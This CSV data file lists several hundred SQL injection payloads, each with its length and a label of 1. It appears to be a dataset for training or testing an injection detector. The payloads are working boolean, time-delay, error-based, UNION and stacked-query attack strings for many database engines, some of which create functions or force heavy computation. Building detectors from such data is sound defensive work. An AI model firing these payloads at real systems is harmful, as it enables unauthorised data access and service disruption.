payload,length,label
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('lqpd'='lqpd",81,1
"1 where 4372=4372;select * from generate_series(3086,3086,case when (3086=3327) then 1 else 0 end) limit 1--",108,1
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,68,1
"-9289)) or make_set(5101=9919,9919) and ((8977=8977",51,1
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr",43,1
"1'+(select ouhd where 8905=8905 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",185,1
1)));select case when 3076=1605 then 1 else null end--,54,1
"-5509%""))) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",79,1
"1"" where 9725=9725;waitfor delay '0:0:5'--",42,1
"-3828%""))) or make_set(1765=8657,8657) and (((""%""=""",51,1
"1%')) and elt(4249=4249,7259) and (('%'='",41,1
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))-- uslt",97,1
"-7083"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ajcl"" like ""ajcl",223,1
1' and (select * from (select(sleep(5)))fzno) and 'mepp'='mepp,62,1
"1"" union all select null,null,null--",36,1
"1"") and (select * from (select(sleep(5)))gcrr)#",47,1
"1' where 9156=9156 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",159,1
"1'||(select 'ymac' from dual where 9268=9268 or 8466=benchmark(5000000,md5(0x694a4745)))||'",91,1
"1'+(select 'bsva' where 4378=4378 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",141,1
"1"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",113,1
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('ekla'='ekla",120,1
"1);select benchmark(5000000,md5(0x4c4d6142)) and (8126=8126",59,1
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""cneo"" like ""cneo",71,1
"1"" where 2365=2365 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,1
1) where 7096=7096;begin user_lock.sleep(5); end--,50,1
"-8797"")) order by 1#",20,1
"1'+(select 'rajp' where 3300=3300;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",118,1
"1"")) as ajwe where 1153=1153 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",90,1
1'))) or sleep(5)#,18,1
"1')) as lrnh where 8569=8569 union all select null,null,null,null,null--",72,1
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('sdnc'='sdnc",181,1
"1)) union all select null,null,null,null--",42,1
1)) as goar where 2405=2405 and 5927=9731--,43,1
"1'))) or elt(6272=6272,sleep(5)) and ((('cjre'='cjre",52,1
"-5845'))) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",72,1
"-7793""))) or (8459=8459)*4906 and (((""lias""=""lias",49,1
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",92,1
"1'+(select kqac where 4362=4362 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",107,1
1') or sleep(5),15,1
"-1802%')) union all select 1002,1002,1002,1002,1002,1002,1002#",62,1
"1 union all select null,null,null,null,null,null,null#",54,1
1)) and 7533=7533 and ((8738=8738,33,1
1') as yyyb where 1705=1705 and (8770=6988)*6988--,50,1
"1) where 6374=6374 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",221,1
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",65,1
"1) where 5012=5012 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",218,1
1%') rlike sleep(5) and ('%'=',30,1
"1%""))) and 8594=(select 8594 from pg_sleep(5))--",48,1
"1',(select (case when (6560=2813) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",97,1
"1') as knxr where 5662=5662 union all select null,null,null,null,null,null,null,null#",85,1
-3105' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'srep'='srep,209,1
"1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,1
"-6520%"") order by 1#",20,1
"1'+(select mumb where 4658=4658 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",140,1
-1760))) or (8459=8459)*4906 and (((1541=1541,45,1
"1%"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""%""=""",211,1
-5137) or 9323=9323#,20,1
1;begin user_lock.sleep(5); end-- podi,38,1
"1"") union all select null,null#",31,1
"1') where 9272=9272;select benchmark(5000000,md5(0x4c4d6142))--",63,1
"1"")) as wwqj where 3249=3249 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",136,1
"1'||(select 'boib' where 9595=9595;select benchmark(5000000,md5(0x714e4153))#",77,1
1' in boolean mode);select pg_sleep(5)#,39,1
"1"" where 5062=5062;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",135,1
"-2168) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",70,1
-5852) as anca where 3574=3574 or 3958=5536#,44,1
"1%'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",112,1
1')) as cpwx where 5378=5378 rlike (select * from (select(sleep(5)))vwyq)#,74,1
1%')) or (select * from (select(sleep(5)))ydpu) and (('%'=',59,1
"1%') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",154,1
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""vqpx"" like ""vqpx",111,1
1))) union all select null--,28,1
"-4528"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""fxmt"" like ""fxmt",123,1
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'hzav'='hzav",94,1
"1"") as hymr where 5497=5497 union all select null,null,null,null--",66,1
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('tpih'='tpih",122,1
1') where 4949=4949;waitfor delay '0:0:5'--,43,1
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""fvtu"" like ""fvtu",164,1
"1"")) as yiaw where 2841=2841 or sleep(5)--",42,1
"1%"" or elt(5873=5873,sleep(5))#",31,1
"1') or 8421=(select count(*) from generate_series(1,5000000))",61,1
"-9110"")) union all select 2263,2263,2263,2263,2263#",51,1
1'+(select 'lcru' where 3215=3215;select case when 7717=7717 then 1 else null end--,83,1
"1%""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",50,1
"1""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""epwi"" like ""epwi",181,1
"-4223'))) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",77,1
"1) where 6035=6035;select benchmark(5000000,md5(0x714e4153))#",61,1
"1) where 1079=1079;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,1
"1 where 2363=2363 union all select null,null,null,null,null--",61,1
"1"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",93,1
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'lvyw'='lvyw,200,1
-7874))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((2817=2817,205,1
"1)) or 8466=benchmark(5000000,md5(0x694a4745)) and ((8189=8189",62,1
"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""uqyb""=""uqyb",133,1
"1"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,1
"1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",153,1
"-3562"") as eghl where 7094=7094 union all select 7094,7094,7094,7094#",69,1
"-5637%""))) or 6872=6872 and (((""%""=""",36,1
"1"")) as jikg where 8258=8258 and (3973=1047)*1047--",51,1
"1%');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('%'='",97,1
"1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='",119,1
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('bdsq' like 'bdsq",136,1
1'));select case when 2930=7964 then 1 else null end--,54,1
"1""));begin user_lock.sleep(5); end and ((""cxoi""=""cxoi",53,1
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,1
"1"" where 4808=4808 union all select null,null,null,null,null,null,null#",71,1
"1') where 3579=3579 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",208,1
"1 or 8466=benchmark(5000000,md5(0x694a4745))",44,1
"-5230"") or elt(1032=1032,3623) and (""aivb"" like ""aivb",53,1
"1%"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",47,1
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",129,1
"1"" where 8016=8016;select count(*) from generate_series(1,5000000)--",68,1
1') as lgex where 4068=4068 and 1378=9247--,43,1
"-3666""))) union all select 4136,4136,4136--",43,1
"-5617) where 2132=2132 union all select 2132,2132,2132,2132#",60,1
"-8893%') union all select 1254,1254--",37,1
1 and 8594=(select 8594 from pg_sleep(5))--,43,1
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",59,1
"1' where 3760=3760 union all select null,null,null,null,null,null,null,null#",76,1
"1'))) union all select null,null,null,null,null,null#",53,1
"1 and 8635=(select count(*) from generate_series(1,5000000))--",62,1
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((6977=6977",114,1
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""azpb""=""azpb",126,1
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ugum' like 'ugum",129,1
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",66,1
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",101,1
"1'||(select 'bhxx' where 2585=2585;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",119,1
"1) union all select null,null,null,null,null,null,null--",56,1
"1"") as qnmd where 5642=5642;select (case when (9318=7198) then 9318 else 9318*(select 9318 from information_schema.character_sets) end)#",136,1
"1"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",143,1
-8447 where 2850=2850 or 7147=3262,34,1
1' where 8770=8770 union all select null--,42,1
"1))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",156,1
"1 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",103,1
"1') and elt(3528=3566,3566)",27,1
"-5014"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dkyp"" like ""dkyp",210,1
"1') where 1363=1363;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",111,1
1') or (select * from (select(sleep(5)))sddo)#,46,1
"1%') union all select null,null,null,null--",43,1
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('ztmd'='ztmd",103,1
1')));if(7899=7899) select 7899 else drop function zbbp--,57,1
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('beoh'='beoh",113,1
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('bzak' like 'bzak",87,1
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((3044=3044",120,1
"-2982' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'iqwn'='iqwn",218,1
"-4317"")) as nxvn where 2566=2566 union all select 2566,2566,2566#",65,1
"1%"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",69,1
1);begin user_lock.sleep(5); end--,34,1
"-9944"")) or 8537=2039 and ((""kfzj""=""kfzj",40,1
"1'+(select 'ewlk' where 1078=1078 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",186,1
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""endx""=""endx",215,1
(7098=7098 and sleep(5)),24,1
1' and 1541=6868#,17,1
"1) where 8375=8375;select * from generate_series(6468,6468,case when (6468=7999) then 1 else 0 end) limit 1--",109,1
1%';select (case when (3677=2193) then 3677 else 1/(select 0) end)--,68,1
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",65,1
"-9565"" where 1616=1616 union all select 1616,1616,1616,1616--",61,1
"-5411%"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",201,1
"1) as clye where 7842=7842 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",134,1
-2569' union all select 4484--,30,1
"1) as ahfj where 4776=4776 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",128,1
"1%"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",167,1
-6548 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- rlda,214,1
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ixlk",159,1
"1%' union all select null,null,null,null,null,null#",51,1
"-5032' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",201,1
"1%' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and '%'='",105,1
"1"")) as rpxd where 4929=4929;waitfor delay '0:0:5'--",52,1
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('ywbs'='ywbs,85,1
"-3781%') union all select 7497,7497,7497,7497,7497--",52,1
1) rlike sleep(5),17,1
"1';select count(*) from generate_series(1,5000000)--",52,1
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""%""=""",112,1
"1'||(select 'ussi' where 8958=8958;select benchmark(5000000,md5(0x4c4d6142)))||'",80,1
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",225,1
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",76,1
"1"") and 4595=4595#",18,1
-4057') order by 1#,19,1
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""fpqh""=""fpqh",115,1
"1') union all select null,null,null,null,null,null,null--",57,1
-6327')) union all select 2685--,32,1
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",71,1
"1) or elt(5873=5873,sleep(5))#",30,1
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cssb'='cssb",82,1
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",122,1
"1))) union all select null,null,null,null,null,null,null#",57,1
"1%')));select count(*) from generate_series(1,5000000)--",56,1
"1""""(.'.(,(.",11,1
"1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--",94,1
"1"") where 4567=4567 or 8156=(select count(*) from generate_series(1,5000000))--",79,1
-5820')) as lkik where 4044=4044 or 7156=9197--,47,1
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",112,1
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",103,1
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",128,1
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null)",69,1
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",76,1
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""bzzt"" like ""bzzt",205,1
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,1
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",204,1
1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#,112,1
"-5288') or make_set(1164=1710,1710) and ('pkwy'='pkwy",53,1
"1"") where 6679=6679 rlike sleep(5)#",35,1
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""kssm""=""kssm",80,1
"-1894') union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",70,1
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",150,1
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",49,1
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",42,1
"1"" where 1982=1982;(select * from (select(sleep(5)))acdk)#",58,1
"1 or elt(6272=6272,sleep(5))# klaw",34,1
"1',(select (case when (5249=9648) then 1 else 1/(select 0) end))",64,1
"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",216,1
1)) rlike (select * from (select(sleep(5)))vwyq)#,49,1
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('opll' like 'opll",129,1
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",78,1
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",123,1
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",158,1
"1%');select benchmark(5000000,md5(0x4c4d6142)) and ('%'='",57,1
"-6906' where 1839=1839 union all select 1839,1839,1839,1839,1839--",66,1
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""cwpt"" like ""cwpt",136,1
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",192,1
"1%"")) union all select null,null,null,null,null,null--",54,1
-2797'))) union all select 5711#,32,1
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,258,1
"1"" or 8156=(select count(*) from generate_series(1,5000000))--",62,1
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",103,1
1 and (3020=3020)*6703# syuj,28,1
"1%""))) union all select null,null,null,null,null,null,null--",60,1
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",129,1
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""vkqt""=""vkqt",81,1
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,1
1') and 8404=8651#,18,1
1) as rqac where 3381=3381 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,122,1
"-7008')) union all select 9080,9080,9080#",41,1
"1 or elt(6272=6272,sleep(5))",28,1
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",95,1
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",67,1
1'+(select 'yahd' where 5850=5850;select sleep(5)#,50,1
"1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",129,1
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'oofd'='oofd,222,1
"1')) as peeo where 5356=5356 and elt(4722=2382,2382)--",54,1
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('aumk' like 'aumk",88,1
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",203,1
-2749') as fiho where 3531=3531 or 2777=1485#,45,1
"-4826 union all select 4532,4532,4532,4532,4532--",49,1
-1643' where 1968=1968 or 3484=6642,35,1
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",69,1
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (9932=9932,204,1
"-6770')) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",71,1
-7041') where 6307=6307 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,118,1
1' rlike (select * from (select(sleep(5)))sgvo) and 'mabd'='mabd,64,1
-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),100,1
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",66,1
"1) where 6990=6990 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,1
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",175,1
1')) as jzoh where 6484=6484 and 7364=4233--,44,1
"1'||(select 'eamo' where 4958=4958 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",113,1
1)));begin dbms_lock.sleep(5); end and (((4675=4675,51,1
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('wyvx'='wyvx",138,1
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,1
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,59,1
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",113,1
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xonc'='xonc",177,1
"1"" where 1386=1386;select (case when (3435=4011) then 1 else 3435*(select 3435 from master..sysdatabases) end)--",112,1
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",128,1
"1 or 8156=(select count(*) from generate_series(1,5000000))--",61,1
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",87,1
-8397'))) or 2171=4788,22,1
"1""));select case when 1802=7063 then 1 else null end--",54,1
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""vudj"" like ""vudj",119,1
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",110,1
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",145,1
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('crus'='crus",180,1
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",47,1
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'esjl'='esjl",110,1
"-7656""))) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",78,1
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'sloy'='sloy",221,1
